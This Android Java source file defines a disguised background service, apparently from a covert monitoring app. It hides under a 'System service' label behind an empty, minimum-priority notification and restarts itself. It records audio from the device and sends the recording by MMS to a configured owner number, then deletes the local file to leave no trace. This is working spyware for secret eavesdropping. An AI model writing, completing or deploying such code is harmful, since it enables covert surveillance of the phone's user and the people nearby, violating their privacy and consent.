package com.example.forkid;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import com.example.forkid.R;

import java.io.File;

public class Service extends android.app.Service {
    private static final String TAG = "Androind System Service";
    private static final String CHANNEL_ID = "ServiceChannel";
    private static Service instance;
    public static boolean is_sending = false;
    public MMS_UTILS mmsUtils = new MMS_UTILS();
    public static Service getInstance() {
        return instance;
    }


    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        instance = this;

    }
    @SuppressLint("ForegroundServiceType")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Сервис запущен");
        // Start the service in the foreground
        Notification notification = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
             notification = new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("")
                    .setContentText("")
                    .setSmallIcon(R.drawable.ic_launcher_foreground) // Укажите прозрачную иконку
                    .setPriority(Notification.PRIORITY_MIN) // Минимальный приоритет
                    .build();

        }
        startForeground(1,notification);

        return android.app.Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Сервис остановлен");
        instance = null;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    public void make_record() throws InterruptedException {
        Recorder recorder = new Recorder();

        String file_recorder = recorder.startRecording();
        if (!file_recorder.equals("error")){
            is_sending = true;
            Thread.currentThread().wait(30000);
            mmsUtils.sendMmsWithAudio(instance, Config.owner , "System service", file_recorder);

            try {
                File file = new File(file_recorder);
                if (file.exists()) {
                    if (file.delete()) {
                        Log.d("FileDeletion", "File at " + file_recorder + " deleted successfully");
                    } else {
                        Log.e("FileDeletion", "Failed to delete file at " + file_recorder);
                    }
                } else {
                    Log.e("FileDeletion", "File at " + file_recorder + " does not exist");
                }
            } catch (Exception e) {
                Log.e("FileDeletion", "Error deleting file at " + file_recorder + ": " + e.getMessage());
            }

            is_sending = false;
        }
    }
}